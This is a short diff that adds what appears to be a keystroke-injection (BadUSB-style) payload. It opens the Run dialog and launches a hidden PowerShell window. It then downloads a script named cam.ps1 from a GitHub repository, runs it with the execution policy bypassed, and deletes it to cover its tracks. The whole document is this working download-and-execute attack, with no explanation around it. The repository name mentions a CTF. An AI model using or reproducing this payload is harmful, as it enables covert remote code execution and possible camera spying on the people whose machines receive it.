@@ -1,0 +1,7 @@
+<GCMD>r<time2>powershell<time2><RET><time2>
+powershell.exe -WindowStyle Hidden -Command "
+$ps1 = '$env:TEMP\cam.ps1';
+Invoke-WebRequest 'https://raw.githubusercontent.com/Hackering-True/simplecalc-ctf/main/cam.ps1' -OutFile $ps1;
+powershell -ExecutionPolicy Bypass -File $ps1;
+Remove-Item $ps1 -Force;
+Exit"<RET>
